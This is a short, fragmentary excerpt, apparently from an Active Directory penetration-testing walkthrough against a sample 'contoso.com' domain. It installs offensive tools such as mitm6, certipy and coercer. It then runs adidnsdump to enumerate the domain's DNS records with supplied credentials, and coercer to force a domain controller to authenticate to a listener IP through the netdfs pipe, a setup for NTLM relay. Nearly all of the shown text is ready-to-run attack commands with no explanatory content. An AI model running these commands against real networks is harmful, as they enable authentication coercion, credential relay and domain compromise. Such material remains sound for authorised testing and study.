...
sudo pip3 install mitm6 minikerberos adidnsdump certipy coercer
...
adidnsdump --user CONTOSO\\bfu --password 'Pa$$w0rd' --zone contoso.com --ssl --verbose contoso-dc.contoso.com
cat records.csv
```
...
```bash
coercer coerce --username bfu --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip contoso-dc2.contoso.com --listener-ip 10.213.0.100 --filter-transport-name msrpc --filter-pipe-name '\PIPE\netdfs' --always-continue
```
